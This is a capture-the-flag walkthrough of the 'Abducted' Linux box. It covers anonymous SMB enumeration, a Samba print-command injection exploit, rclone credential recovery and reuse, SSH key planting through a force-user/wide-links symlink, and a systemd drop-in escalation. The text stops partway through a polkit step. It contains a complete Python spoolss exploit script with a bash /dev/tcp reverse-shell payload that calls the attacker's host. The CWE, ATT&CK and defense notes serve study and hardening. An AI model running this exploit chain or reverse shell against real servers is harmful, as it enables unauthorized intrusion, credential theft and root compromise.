# Abducted
Abducted is a medium-difficulty Linux machine built around the on-premise file and print server of a professional-services firm.
# HTB Abducted — Samba Print RCE to Root

_Medium Linux — Hack The Box practice notes: enumeration to root, with CWE/OWASP/MITRE ATT&CK classification and defense notes_

## Overview

**Box:** Abducted (Hack The Box, Medium, Linux) — a fictional professional-services firm's on-premise file-and-print server.

**Attack path at a glance:**

1. Enumerate SMB/RPC anonymously → find a guest-accessible printer share.
2. Identify CVE-2026-4480 (Samba print-command injection) as the only pre-auth-reachable issue on this host.
3. Build a raw spoolss RPC client to smuggle shell metacharacters past the sanitized client tools, and get a shell as `nobody`.
4. Recover an offsite-backup SFTP credential from a world-readable `rclone.conf` and decode it — the password turns out to be reused for a real account, `scott`.
5. Abuse a second share's `force user` + `wide links` misconfiguration to plant an SSH key as `marcus`.
6. Find a group-writable systemd drop-in directory and a polkit rule that silently delegates service control, drop a root-owned `ExecStartPre`, restart the service, and pick up a setuid shell.

**Skills demonstrated:** anonymous SMB/RPC enumeration; CVE triage by exposure surface rather than banner-matching; raw MS-RPRN/spoolss scripting to bypass client-side sanitization; blind command-injection confirmation via an out-of-band channel; rclone credential recovery; Samba `wide links`/`force user` symlink abuse; polkit rule analysis; systemd service drop-in privilege escalation.

---

## Phase 1 — Enumeration

### 1. Nmap Service & Version Scan

**Goal:** Build an initial map of what's reachable on the host before touching anything else — which ports are open, what's listening, and roughly how old the stack is.

**Why this command?:** `-sSVC` combines a fast SYN scan with version detection and Nmap's default script set in one pass — the efficient default for a first look at an unknown host. `--open` keeps the output readable, and `-Pn` is necessary because HTB targets commonly block ICMP, so a host-discovery probe would wrongly mark the box as down before any port scan even runs.

**How it works:** A SYN scan sends a TCP SYN to each target port and reads the response (SYN/ACK = open, RST = closed, nothing = filtered) without completing the handshake, which keeps it fast and relatively quiet. Version detection then follows up on open ports with protocol-specific probes to grab banners, and the default scripts run a curated set of low-risk enumeration scripts against whatever is found.

**Flags explained:**

- `-s S` — TCP SYN ("half-open") scan
- `V` — version detection
- `C` — run default NSE scripts
- `--open` — only list ports Nmap determines are open
- `-Pn` — skip host-discovery ping, treat the host as online unconditionally

**Expected output:**

```
PORT    STATE SERVICE      VERSION
22/tcp  open  ssh          OpenSSH 9.6p1 Ubuntu 3ubuntu13.9 (Ubuntu Linux; protocol 2.0)
139/tcp open  netbios-ssn  Samba smbd 4
445/tcp open  netbios-ssn  Samba smbd 4
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**Decision point:** No web service means the usual "check port 80/443 first" instinct doesn't apply — SMB (139/445) and SSH (22) are the entire attack surface, so enumeration has to go deep on Samba rather than wide across many services.

**If this fails...:** If the scan hangs, the HTB VPN link can be lossy — rerun with `-T4` or ping the VPN gateway first. If no ports show at all, confirm the lab VPN is actually up before assuming the host is firewalled.

**Under the hood:** The OpenSSH banner (`9.6p1 Ubuntu 3ubuntu13.9`) is a free version oracle: Ubuntu backports security fixes into a fixed upstream OpenSSH version and only bumps the trailing Ubuntu revision, so the banner's suffix maps to a specific Ubuntu release and patch date even though the Samba banner (`smbd 4`) deliberately gives nothing away.

**Classification & defense:**

- Not a vulnerability by itself — MITRE ATT&CK **T1046** (Network Service Discovery).
- Defense: banner suppression doesn't stop a determined attacker (see below), so the real control is minimizing exposed services and keeping them patched, not hiding their versions.

**Key takeaway:** _A service banner that hides its own version just means the next fingerprinting step has to be smarter — it doesn't close the gap._

### 2. Anonymous SMB Share Enumeration

**Goal:** Discover what the Samba server is sharing out, and whether any of it is reachable without credentials.

**Why this command?:** `smbclient -L` is the fastest way to list a server's shares over SMB, and `-N` suppresses the password prompt by attempting a null (anonymous) session — exactly the access level a real unauthenticated attacker would have.

**How it works:** The client negotiates an SMB session with no credentials; if the server permits guest/anonymous access at all, it returns the share list configured to be visible to that session.

**Flags explained:**

- `-L` — list shares on the target instead of connecting to one
- `-N` — no password (attempt a null/guest session)

**Expected output:**

```
Sharename       Type      Comment
---------       ----      -------
HP-Reception    Printer   Reception printer
projects        Disk      Hartley Group Project Files
transfer        Disk      Staff file transfer
IPC$            IPC       IPC Service (Hartley Group Document Services)
```

**Decision point:** `projects` and `transfer` reject anonymous access, so they're parked for later. `HP-Reception` is the one share a guest can actually touch — on a box with no web app, a guest-writable printer queue is the obvious next thing to dig into.

**If this fails...:** An "Access Denied" or logon-failure status instead of a share list usually means guest access is fully disabled server-side — enumeration then has to pivot toward finding valid credentials elsewhere before SMB opens up at all.

**Under the hood:** Samba's `map to guest` setting controls whether an unauthenticated or bad-credential session gets silently mapped to the guest account rather than rejected; a share additionally needs `guest ok = yes` to be visible to that mapped session. Both had to be true for `HP-Reception` to show up at all.

**Classification & defense:**

- CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) for the disclosure itself; MITRE ATT&CK **T1135** (Network Share Discovery).
- Defense: disable `map to guest` unless guest access is genuinely required; if a guest printer is a real business need, isolate it in its own Samba instance rather than alongside shares like `projects` and `transfer`.

**Key takeaway:** _A "guest" printer share is still a network-reachable service account — treat it with the same suspicion as an open port, not as a harmless convenience._

### 3. RPC `srvinfo` Query & the Limits of Remote Fingerprinting

**Goal:** Try to pin down the exact Samba version remotely, to scope which CVEs are even in play.

**Why this command?:** `rpcclient` with a null session can query the `srvsvc` RPC interface for server metadata with no credentials, so it's a natural next step after a share listing — if it works, it can save a lot of guesswork.

**How it works:** `srvinfo` calls the `NetServerGetInfo` RPC method over the `srvsvc` named pipe and prints back whatever platform/OS/comment fields the server reports.

**Flags explained:**

- `-U ""` — connect as an empty/anonymous username
- `-N` — no password prompt
- `-c "srvinfo"` — run this one RPC command non-interactively instead of dropping into the `rpcclient` shell

**Expected output:**

```
Wk Sv PrQ Unx NT SNT Hartley Group Document Services
  platform_id     :   500
  os version      :   6.1
  server type     :   0x809a03
```

**Decision point:** This is where fingerprinting has to be abandoned as a strategy: `os version 6.1` is a hardcoded legacy value Samba has reported for compatibility for years, not the real package version, and SMB2 negotiation never carries a package version at all. The investigation shifts from "what exact version is this" to "what's the oldest this could plausibly be, and what's actually reachable."

**If this fails...:** If the null session is rejected here even though share listing worked, some servers allow anonymous tree connects while locking down RPC pipes separately — that's still useful information about where the guest boundary actually sits.

**Under the hood:** The `server type` bitmask (`0x809a03`) describes roles the server advertises (workstation, server, print-queue server, Unix, NT-compatible, among others) — useful for confirming "this is a Unix/Samba box acting as a print server," but it says nothing about patch level, which is exactly why the next step has to reason from exposed _surface_ instead of version strings.

**Classification & defense:**

- CWE-200 again, more narrowly: the service is designed to answer unauthenticated metadata queries at all.
- MITRE ATT&CK **T1590**/**T1592** (Gather Victim Network/Host Information).
- Defense: restricting anonymous RPC access raises the cost of this step, but shouldn't be treated as a real security boundary on its own.

**Key takeaway:** _When a target won't give up its version, don't guess — reason about which known issues are even reachable given what's already confirmed exposed._

---

## Phase 2 — Vulnerability Identification

### 4. Narrowing the May 2026 Samba Patch Batch to CVE-2026-4480

**Goal:** Turn "this is an old-ish Samba with no clean version fingerprint" into one specific, testable vulnerability hypothesis.

**Why this approach?:** Samba's May 2026 security release patched several unrelated issues at once — reparse-point access checks, the `vfs_worm` module, GPO certificate handling, WINS, and the print-command injection. Guessing which one applies from the banner alone isn't possible, so the right move is to match each candidate's _precondition_ against what enumeration actually confirmed is exposed, and eliminate the rest.

**How it works:** Four of the five May-2026 issues need something this host doesn't present — an Active Directory domain controller, a WINS server, the `vfs_worm` module, or authenticated file operations. The fifth, the print-command injection, needs exactly one thing: a guest-accessible printer share with an external print command. That's precisely what Phase 1 found sitting in the share list.

**Flags explained:** _(Not applicable — this step is analytical rather than a single command.)_

**Expected output:** No command output; the "output" here is a documented hypothesis — this host is almost certainly vulnerable to CVE-2026-4480, reachable via the `HP-Reception` printer share, and the way to confirm it without a false positive is an out-of-band callback rather than a destructive first attempt.

**Decision point:** Because `smb.conf`'s `print command` line can't be read remotely, this stays a hypothesis — confirmed by _behavior_ (Phase 3's out-of-band probe), not by a banner match. Committing straight to a reverse-shell payload without that confirmation step first risks burning the attempt on a guess.

**If this fails...:** If the printer share had required authentication, or the host turned out to run `printing = cups`, this specific CVE would be a dead end, and the investigation would fall back to the two restricted shares (`projects`, `transfer`) for a credentialed path instead.

**Under the hood:** The public advisory for this CVE confirms the precondition directly: servers using `printing = cups` or `printing = iprint` route print jobs through the CUPS API rather than a shell `system()` call, and aren't affected at all — which lines up exactly with why this host, using `printing = sysv`, is in scope. The advisory also notes that quoting the macro as `'%J'` makes exploitation harder but not impossible, since command-line option injection is still possible even then.

**Classification & defense:**

- **CWE-78** — Improper Neutralization of Special Elements used in an OS Command ("OS Command Injection").
- **OWASP A03:2021 – Injection.**
- Published 2026-05-26; affects Samba ≤4.22.9, 4.23.0–4.23.7, and 4.24.0–4.24.2; fixed in 4.22.10, 4.23.8, and 4.24.3. Severity is reported inconsistently across vendors (commonly cited in the 8.5–9.0 CVSS range), but every source agrees it's pre-auth, network-reachable, and low-complexity to exploit once a guest print queue is found.
- Defense: patch to a fixed Samba release; if that's not immediately possible, remove `%J` from `print command` entirely or move to `printing = cups`; disable guest printing on any share that doesn't explicitly need it.

**Key takeaway:** _A patch batch isn't one vulnerability — matching exposed surface against each item's precondition is how you pick the right one without a version string._

---

## Phase 3 — Exploitation & Foothold

### 5. Building a Raw `spoolss` Print Job (Bypassing Client-Side Sanitization)

**Goal:** Submit a print job whose job name — which lands in the vulnerable `%J` macro — contains raw shell metacharacters, something normal printing clients won't let through.

**Why this command?:** The obvious first move, queuing a job with `smbclient`/`smbspool`, is a dead end: those tools go over the legacy RAP print interface, which sanitizes shell metacharacters to `_` before the name ever reaches `%J`, and `smbclient -c` additionally splits its own command list on `;`. The fix is to stop going through a sanitizing client and talk to the `spoolss` RPC interface directly — exactly what Samba's own Python bindings (`samba.dcerpc.spoolss`) expose.

**How it works:** A print job over `spoolss` is driven through the printer handle with a fixed sequence of RPC calls: `OpenPrinter` to get a handle on the share, `StartDocPrinter` to begin the job (its `document_name` field is the value that becomes `%J`), `StartPagePrinter`, `WritePrinter` to send the actual spool-file bytes (this becomes `%s`), `EndPagePrinter`, and finally `EndDocPrinter` — the call that triggers Samba's server-side `system()` invocation of the configured print command. `ClosePrinter` releases the handle afterward.

**Flags explained:**

- `creds.set_anonymous()` — use a null/guest session, since `HP-Reception` allows it
- `PRINTER_ACCESS_USE` (`0x00000008`) — the access mask `OpenPrinter` requests; the minimum a normal client needs to submit jobs
- `DocumentInfo1` / `level = 1` — a binding quirk: the `DocumentInfoCtr` union can't be constructed directly, so a level-1 `DocumentInfo1` object is built first and then assigned into the container's `info` member

**Expected output:**

```python
i1 = spoolss.DocumentInfo1(); i1.document_name = "|sh"; i1.output_file = None; i1.datatype = "RAW"
ctr = spoolss.DocumentInfoCtr(); ctr.level = 1; ctr.info = i1
iface.StartDocPrinter(h, ctr)
```

No console output from these calls themselves — success just means no RPC fault is raised and the job lifecycle completes.

**Decision point:** With `document_name = "|sh"`, the configured `print command = /usr/local/bin/printaudit %J %s` is rewritten by naive macro substitution into `/usr/local/bin/printaudit |sh %s`. Handed to a shell, the `|` ends the `printaudit` invocation early and pipes into a new `sh` command, and the still-substituted `%s` — the real spool-file path — becomes a bare filename argument to that `sh`, which treats any bare filename argument as a script to execute. The spool file's contents are therefore run as an arbitrary shell script, with no character restrictions at all on what that script contains.

**If this fails...:** An RPC fault on `OpenPrinter` usually means the access mask or UNC path is wrong — double-check the share name's case and the leading double backslashes. A fault on `StartDocPrinter` often means the `DocumentInfoCtr` wasn't populated correctly (the level-1-object-then-assign pattern above is easy to get backward).

**Under the hood:** The substitution happens in `generic_job_submit()` in `source3/printing/print_generic.c`: Samba takes the configured `print command`, replaces `%J` with the client-supplied job name, and hands the resulting string to the shell. Before the fix, the only sanitization applied to that name was a single substitution turning a literal single-quote character into `_` — nothing else, so `|`, `;`, spaces, `<`, `>`, and `&` all reach the shell completely intact.

**Classification & defense:**

- **CWE-78** (OS Command Injection), same root cause as item 4 — this is where it's actually weaponized.
- MITRE ATT&CK **T1210** (Exploitation of Remote Services).
- Defense: the same fix as item 4 (patch, or strip `%J`/switch to CUPS) closes this completely. Client-side sanitization in `smbclient` was never a real security boundary, just an accident of that tool's implementation — there's no RPC-layer-specific mitigation beyond fixing the root cause.

**Key takeaway:** _If a client-side tool appears to "fix" an injection by sanitizing input, that's a property of the tool, not the server — check the protocol directly before concluding something is safe._

### 6. Confirming Blind Injection with an Out-of-Band ICMP Probe

**Goal:** Prove code execution is actually happening before risking a real payload, since the print command runs server-side and returns nothing to the client.

**Why this command?:** This is a _blind_ injection — there's no response channel back to the attacker through the RPC calls themselves — so the safest way to validate the hypothesis from item 4 is a side channel that can be observed independently of the exploit: an ICMP echo request captured on the attacker's own interface.

**How it works:** The spool-file body (which becomes the script `sh` executes) is set to a simple `ping -c 3 <attacker-tun0-IP>`, and a packet capture runs on the attacker side filtering for ICMP from the target. If echo requests arrive, the spool body ran on the target — independent of whether anything "looks" successful from the SMB session itself.

**Flags explained:**

- `-ni tun0` — no DNS resolution, numeric output only, listen on the HTB VPN interface specifically
- `icmp and host <target>` — a capture filter limited to ICMP traffic from the one IP being tested, to cut noise

**Expected output:**

```
$ sudo tcpdump -ni tun0 icmp and host 10.129.244.177
IP 10.129.244.177 > 10.10.14.100: ICMP echo request, id ..., seq 1, length 64
IP 10.129.244.177 > 10.10.14.100: ICMP echo request, id ..., seq 2, length 64
IP 10.129.244.177 > 10.10.14.100: ICMP echo request, id ..., seq 3, length 64
```

**Decision point:** Echo requests arriving confirms unauthenticated code execution and validates the hypothesis before anything higher-value (a reverse shell) is attempted. No echo requests means the hypothesis needs re-examination — wrong share, wrong access mask, or the print command isn't actually `%J`-vulnerable the way assumed.

**If this fails...:** Before assuming the vulnerability is absent, check whether the spool body actually has content (an empty file is silently skipped — see item 7's note on this) and whether the job is genuinely completing (`EndDocPrinter` actually reached, not just `StartDocPrinter`).

**Under the hood:** Samba's own print logging shows nothing unusual here: from the daemon's point of view the configured command ran and the job finished, so no failure or anomaly gets written anywhere in the print subsystem's logs. A print-processing service also has no ordinary reason to open outbound connections on its own, which is precisely why unexpected egress from a host like this is a disproportionately strong signal for a defender, even though the exploit itself leaves nothing in the application logs to find.

**Classification & defense:**

- Same CWE-78 / T1210 classification as item 5 — this step is a verification technique, not a new vulnerability class.
- Detection angle: egress monitoring from print-service hosts specifically (they have no legitimate reason to dial out) is one of the few reliable ways to catch this class of abuse when the exploit itself is silent in application logs.

**Key takeaway:** _For a blind injection, prove execution with a side channel you fully control before spending the attempt on a payload you can't verify._

### 7. Weaponizing the Payload and Catching the Shell

**Goal:** Turn the confirmed injection into an interactive shell, and understand why a naive reverse-shell one-liner would actually hang the exploit.

**Why this command?:** `EndDocPrinter` runs the print command synchronously inside the RPC call — the server doesn't return until `system()` returns. A foreground reverse shell never returns on its own, so without detaching it, the RPC call (and the `smbd` worker handling it) would simply hang until it timed out, and the attacker would never get a connection.

**How it works:** Wrapping the reverse-shell one-liner in `setsid ... &` detaches it from the invoking shell's session and backgrounds it, so the wrapping shell can return immediately (completing `system()`, letting `EndDocPrinter` return and the RPC call succeed) while the detached shell keeps running independently and makes its outbound connection a moment later.

**Flags explained:**

- `setsid` — start the command in a new session, detached from the parent's controlling terminal/process group
- `&` — background the command so the invoking shell doesn't block on it
- `>/dev/null 2>&1` — discard stdout/stderr so a broken pipe after the parent exits doesn't cause issues
- `bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1` — Bash's `/dev/tcp` pseudo-device opens a raw TCP socket, and redirecting an interactive shell's input/output/error through it is the classic one-liner reverse shell

**Expected output:**

```
$ nc -lvnp 4444
$ python3 exploit.py
[+] job submitted
connect to [10.10.14.100] from (UNKNOWN) [10.129.244.177]
id
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
```

**Decision point:** The shell lands as `nobody` (UID 65534) — the classic low-privilege placeholder account — confirming the print-processing worker runs unprivileged, as expected for a service designed to handle untrusted guest jobs. From here, the task shifts from "get execution" to "find something `nobody` can read that a real account can't."

**If this fails...:** If the listener never receives a connection, check that the spool body is non-empty — Samba skips the print command entirely for a zero-byte spool file — and confirm the LHOST/LPORT in the payload match the listener exactly (a mismatched interface IP is a common mistake on multi-interface HTB attack boxes).

**Under the hood:** The full assembled exploit chains items 5–7 into one script:

```python
#!/usr/bin/env python3
from samba.dcerpc import spoolss
from samba.param import LoadParm
from samba.credentials import Credentials

RHOST, LHOST, LPORT = "10.129.244.177", "10.10.14.100", 4444
DATA = ("setsid bash -c 'bash -i >& /dev/tcp/%s/%d 0>&1' >/dev/null 2>&1 &\n" % (LHOST, LPORT)).encode()

lp = LoadParm(); lp.load_default()
creds = Credentials(); creds.guess(lp); creds.set_anonymous()
iface = spoolss.spoolss(r"ncacn_np:%s[\pipe\spoolss]" % RHOST, lp, creds)

h = iface.OpenPrinter("\\\\%s\\HP-Reception" % RHOST, "", spoolss.DevmodeContainer(), 0x00000008)
i1 = spoolss.DocumentInfo1(); i1.document_name = "|sh"; i1.output_file = None; i1.datatype = "RAW"
ctr = spoolss.DocumentInfoCtr(); ctr.level = 1; ctr.info = i1

iface.StartDocPrinter(h, ctr)
iface.StartPagePrinter(h); iface.WritePrinter(h, DATA, len(DATA))
iface.EndPagePrinter(h); iface.EndDocPrinter(h); iface.ClosePrinter(h)
print("[+] job submitted")
```

**Classification & defense:**

- CWE-78 / T1210 as before, plus MITRE ATT&CK **T1059.004** (Command and Scripting Interpreter: Unix Shell) for the payload itself.
- Defense: beyond patching, network egress filtering from service hosts would have blocked the callback even if the injection succeeded; EDR or process-lineage monitoring that flags `smbd` spawning a shell is another independent layer.

**Key takeaway:** _A synchronous RPC call is a hidden constraint on your payload — always ask what's waiting for your command to return before you pick one that never will._

---

## Phase 4 — Post-Exploitation: `nobody` → `scott`

### 8. Discovering and Decoding the World-Readable `rclone.conf`

**Goal:** Turn a low-privilege shell into real, usable credentials.

**Why this command?:** With no obvious SUID binaries or writable cron jobs immediately visible, checking what `nobody` can simply read is the standard next move — and an offsite backup job configured under `/opt/offsite-backup` is exactly the kind of thing that tends to hold credentials, since backup tooling has to authenticate somewhere.

**How it works:** rclone's config format stores remote credentials in a `[section]` per remote. The password field isn't plaintext, but it isn't genuinely encrypted either — it's "obscured" with AES-256-CTR under a single key hardcoded into every copy of rclone's source, which rclone's own documentation is explicit is meant only to deter casual viewing, not to resist a real attacker. Decoding it is as simple as running it back through rclone's own reveal logic.

**Flags explained:** _(a file read, not a command with flags)_ — the relevant fields are `host`, `user`, and `pass` under the `[offsite]` section.

**Expected output:**

```
nobody@abducted:/$ cat /opt/offsite-backup/rclone.conf
[offsite]
type = sftp
host = backup.hartley-group.internal
user = svc-backup
pass = HZKAxfnMj-nLm59X9gpcC2ohjQL-WqVT6yRsNw
shell_type = unix
```

**Decision point:** The `pass` value is clearly an rclone-obscured blob (URL-safe base64), not a plaintext password, so the next step is decoding it rather than trying to use it as-is.

**If this fails...:** If a backup config isn't world-readable on a similar box, look for it in a service account's home directory, a cron job's working directory, or a systemd timer unit that references a backup script.

**Under the hood:** The obscured format is a 16-byte random IV followed by AES-256-CTR ciphertext, both RawURL-base64-encoded together. Because the key is compiled into the binary rather than derived from anything secret, anyone with a copy of rclone (or just the published key bytes) can reverse it — "obscure" was never meant as a boundary against someone who already has filesystem access.

**Classification & defense:**

- **CWE-261** (Weak Encoding for Password) for relying on reversible obfuscation as if it were real protection; **CWE-732** (Incorrect Permission Assignment for Critical Resource) for the world-readable file itself.
- **OWASP A02:2021 – Cryptographic Failures.**
- MITRE ATT&CK **T1552.001** (Unsecured Credentials: Credentials In Files).
- Defense: restrict the config file's permissions to the service account only (`chmod 600`, correct ownership); for real protection, use rclone's separate config-file _encryption_ feature (a user-supplied passphrase via `RCLONE_CONFIG_PASS` or `rclone config`), a different mechanism from per-field obscuring and the thing actually designed to resist an attacker.

**Key takeaway:** _"Obscured" and "encrypted" are not the same promise — check what a tool's own documentation says a mechanism is actually for before trusting it as a security control._

### 9. Decoding the Credential and Pivoting to `scott`

**Goal:** Get the plaintext backup password, then see where else it might work.

**Why this command?:** `rclone reveal` is rclone's own inverse of `rclone obscure` — rather than reimplementing the AES-CTR decode by hand, just ask the tool that created the blob to undo it.

**How it works:** `rclone reveal <blob>` base64-decodes the input, splits it into the IV and ciphertext, and decrypts using the same hardcoded key `obscure` used, printing the plaintext.

**Flags explained:** No flags needed for the simple case — just `rclone reveal "<obscured-string>"`. One real gotcha: an obscured string that happens to start with a `-` can be misparsed by rclone's own argument parser as a flag; prefixing the call with `--` forces it to be treated as a plain argument instead.

**Expected output:**

```
nobody@abducted:/$ rclone reveal HZKAxfnMj-nLm59X9gpcC2ohjQL-WqVT6yRsNw
iXzvcib3SrpZ
```

**Decision point:** A recovered backup password is only useful if it's reused somewhere reachable. Trying it against the one named local account that makes sense to test — `scott`, since the credential was found on this host specifically — is the natural next move, rather than assuming it's only good for the offsite SFTP target.

**If this fails...:** If `reveal` errors with an "illegal base64 data" message, double-check the string was copied exactly — obscured values use URL-safe base64 characters (`-`/`_`) that are easy to mistype or have a shell swallow.

**Under the hood:** This is the same operation a legitimate rclone user would run to recover a password they obscured earlier and forgot — it isn't a secret or exploit-specific command, it's a normal, if under-advertised, part of rclone's own CLI, which is exactly why the "obscuring" was never a real security control.

**Classification & defense:**

- Root cause here isn't a single CWE but a credential-hygiene anti-pattern: password reuse across a backup service account and an interactive login account. MITRE ATT&CK **T1078** (Valid Accounts) for the resulting access, **T1021.004** (Remote Services: SSH) for how it's used.
- **OWASP A07:2021 – Identification and Authentication Failures** covers weak credential practices like reuse broadly.
- Defense: unique, unrelated credentials per service; rotate immediately if any credential is suspected exposed, regardless of which system it was found on.

**Key takeaway:** _A credential's blast radius isn't the system it was found on — always check whether it's been reused anywhere else reachable._

```
scott@abducted:~$ id
uid=1000(scott) gid=1001(scott) groups=1001(scott)
scott@abducted:~$ cat user.txt
<REDACTED>
```

---

## Phase 5 — Privilege Escalation: `scott` → `marcus`

### 10. Diagnosing the `force user` + `wide links` Misconfiguration

**Goal:** Find a way to act as a different, more useful local user — `marcus` — using only the access `scott` already has.

**Why this approach?:** With `scott`'s shell access in hand, the two previously-locked shares (`projects`, `transfer`) are worth revisiting now that there are real credentials to try. Reading `/etc/samba/shares.conf` for the `transfer` share's configuration is what actually exposes the escalation path — the vulnerability here is in how the share is _defined_, not in anything run against it yet.

**How it works:** `force user = marcus` means every file operation through the `transfer` share executes as `marcus` — including his primary group — regardless of which user actually authenticated to the share. Combined with `wide links = yes` and the global `allow insecure wide links = yes`, Samba will also follow symbolic links that point _outside_ the shared directory tree; normally `wide links` is disabled automatically whenever Unix extensions are enabled (to prevent exactly this kind of escape), but `allow insecure wide links` explicitly overrides that protection, and the global config sets `unix extensions = no` to begin with.

**Flags explained:** _(configuration reading, not a command)_ — the relevant directives:

- `force user = marcus` — substitute this identity for all file operations on the share
- `wide links = yes` — allow following symlinks that resolve outside the share's root
- `allow insecure wide links = yes` — override Samba's default refusal to combine `wide links` with Unix extensions
- `valid users = scott` — who may authenticate to the share (separate from _which_ identity the resulting file operations run as)

**Expected output:**

```
scott@abducted:~$ cat /etc/samba/shares.conf
[transfer]
  comment = Staff file transfer
  path = /srv/transfer
  valid users = scott
  force user = marcus
  read only = no
  wide links = yes
  browseable = yes

scott@abducted:~$ grep -E 'unix extensions|wide links' /etc/samba/smb.conf
  unix extensions = no
  allow insecure wide links = yes
```

**Decision point:** `scott` owns `/srv/transfer` on disk, which matters: it means `scott` can create a symlink inside the share's own directory tree using normal filesystem access, without needing any special permission through Samba itself — the symlink is the bridge between what `scott` can do on disk and what the share, once connected to, will do as `marcus`.

**If this fails...:** If `wide links` were left at its default `no` here, this entire path would be closed regardless of `force user` — that combination specifically is what Samba's own documentation singles out as dangerous, so its absence is a strong signal to look elsewhere.

**Under the hood:** `force user` exists as a legitimate feature for letting multiple authenticated users share one set of file permissions on a collaborative share — the danger isn't the feature itself, it's combining it with a symlink-following override that lets the _target_ of that substituted identity extend beyond the share's intended directory tree.

**Classification & defense:**

- **CWE-59** (Improper Link Resolution Before File Access, "Link Following") for the `wide links` behavior; **CWE-732** (Incorrect Permission Assignment) for layering `force user` on top of it.
- **OWASP A01:2021 – Broken Access Control.**
- Defense: never combine `wide links = yes` with `allow insecure wide links = yes` unless every file the `force user` identity can reach is something the connecting user should already be allowed to write; prefer leaving Unix extensions enabled, which disables wide-link following automatically, unless there's a specific reason not to.

**Key takeaway:** _`force user` and `wide links` are each reasonable in isolation — the risk is entirely in what becomes reachable once they're combined._

### 11. Planting an SSH Key as `marcus`

**Goal:** Convert the misconfiguration into an actual interactive login as `marcus`.

**Why this command?:** A symlink placed inside the share, followed by a normal file write through the SMB connection, is the simplest way to get Samba to create a file in `marcus`'s real home directory — something `scott` has no direct Unix permission to do.

**How it works:** `ln -s /home/marcus /srv/transfer/mh` creates a symlink named `mh` inside the share's directory, pointing at `marcus`'s home. Connecting to the share as `scott` and writing through `mh/.ssh/authorized_keys` makes Samba resolve the symlink (allowed because of `wide links`), then create the file as `marcus` (because of `force user`) — landing a `scott`-controlled SSH public key directly in a location `sshd` will trust for `marcus`'s logins.

**Flags explained:**

- `ssh-keygen -q -t ed25519 -N '' -f /tmp/k` — generate a key pair quietly (`-q`), ed25519 type, no passphrase (`-N ''`), to `/tmp/k`
- `smbclient //127.0.0.1/transfer -U 'scott%<password>'` — connect to the share authenticating as `scott` with an inline password
- `-c 'mkdir mh/.ssh; put /tmp/k.pub mh/.ssh/authorized_keys'` — create the `.ssh` directory through the symlink, then upload the public key as `authorized_keys`

**Expected output:**

```
scott@abducted:~$ ln -s /home/marcus /srv/transfer/mh
scott@abducted:~$ smbclient //127.0.0.1/transfer -U 'scott%iXzvcib3SrpZ' \
  -c 'mkdir mh/.ssh; put /tmp/k.pub mh/.ssh/authorized_keys'
putting file /tmp/k.pub as \mh\.ssh\authorized_keys

$ ssh -i /tmp/k marcus@10.129.244.177
marcus@abducted:~$ id
uid=1001(marcus) gid=1002(marcus) groups=1002(marcus),1000(operators)
```

**Decision point:** `marcus`'s group membership — `operators` — matters more here than the shell access itself; it's the thread the next phase pulls on.

**If this fails...:** If the `put` fails with a permission error, the symlink target path is likely wrong — double-check `/home/marcus` actually exists and is spelled correctly. `wide links` won't help if the link itself points nowhere real.

**Under the hood:** This technique works without ever needing write permission on `/home/marcus` directly; the identity substitution happens entirely inside `smbd`'s file-operation layer, which checks the _share's_ configured identity (`marcus`, via `force user`), not the identity that authenticated the SMB session (`scott`). The symlink is just the mechanism that extends the share's writable area to include a directory outside its own path.

**Classification & defense:**

- MITRE ATT&CK **T1098.004** (Account Manipulation: SSH Authorized Keys) — the canonical classification, since the net effect is planting a persistent credential.
- Same CWE-59/CWE-732 root cause as item 10.
- Defense: beyond fixing the share configuration, file-integrity monitoring on `authorized_keys` files (or `auditd` watches on `~/.ssh/`) would catch this regardless of which misconfiguration enabled the write.

**Key takeaway:** _Planting an SSH key is often the real goal of any arbitrary-file-write primitive — a bug that lets you write a file as another user is a login away from full account takeover._

---

## Phase 6 — Privilege Escalation: `marcus` → `root`

### 12. Finding the Group-Writable systemd Drop-In Directory

**Goal:** Find out what `marcus`'s extra group, `operators`, actually grants.

**Why this approach?:** Rather than guessing, searching the filesystem for anything group-writable by `operators` is the systematic way to find what this group membership is actually for — and it turns up a directory, not a file, which is itself a strong signal (directories under `/etc/systemd/system/` are a well-known escalation surface).

**How it works:** `/etc/systemd/system/smbd.service.d/` is a systemd _drop-in_ location: any `*.conf` file placed there is automatically merged into `smbd.service`'s unit definition the next time the unit is loaded, without touching the original unit file at all.

**Flags explained:** _(filesystem inspection, not a command with flags)_ — the key detail is in the permission bits themselves.

**Expected output:**

```
marcus@abducted:~$ ls -ld /etc/systemd/system/smbd.service.d
drwxrws--- 2 root operators 4096 ... /etc/systemd/system/smbd.service.d
```

**Decision point:** `drwxrws---`, group `operators` — the `s` in the group-execute position is the setgid bit, so new files here automatically inherit the `operators` group, and the `w` in the group field means any `operators` member can create files in it right now. Since `smbd` runs as `root`, anything droppable here that runs at service start is arbitrary command execution as `root` — _if_ the service can actually be reloaded and restarted, which an unprivileged user normally can't do to a root-owned unit.

**If this fails...:** If this directory weren't group-writable, the next thing to search for would be other `*.service.d/` directories, sudoers entries for `operators`, or SUID binaries usable by that group.

**Under the hood:** systemd drop-ins exist as a legitimate way to extend a unit's configuration without editing (and risking a package-manager overwrite of) the original unit file; directives like `ExecStartPre=` run _before_ the unit's main process starts, under the same execution context — for `smbd.service`, that's `root`, since it needs to bind privileged port 445 and manage multiple client identities.

**Classification & defense:**

- **CWE-732** (Incorrect Permission Assignment for Critical Resource) — a configuration surface for a root-run service should never be writable by a non-root group.
- MITRE ATT&CK **T1543.002** (Create or Modify System Process: Systemd Service).
- Defense: drop-in directories for privileged services should be root-owned with no group write access; if a group genuinely needs to manage a service's configuration, that should go through a narrowly-scoped, audited mechanism rather than filesystem write access to the unit's own config.

**Key takeaway:** _A group-writable directory that root-owned tooling reads from is functionally the same as a sudo rule — audit it with the same seriousness._

### 13. Enumerating and Interpreting Polkit's Passwordless Delegations

**Goal:** Find out whether `operators` can actually _apply_ a change to this directory — writing a file is only half the problem, since reloading and restarting a root-owned service normally needs authentication too.

**Why this command?:** Looping every registered polkit action through `pkcheck` against the current process is the systematic way to find what, if anything, this session is authorized to do without a password prompt, rather than guessing at `systemctl` commands one at a time.

**How it works:** `pkaction` lists every action ID polkit knows about; `pkcheck --action-id <id> --process $$` asks polkit's authority to evaluate that specific action against the calling process's identity and session, printing whether it's allowed with no authentication required.

**Flags explained:**

- `pkaction` — list all registered polkit action IDs on the system
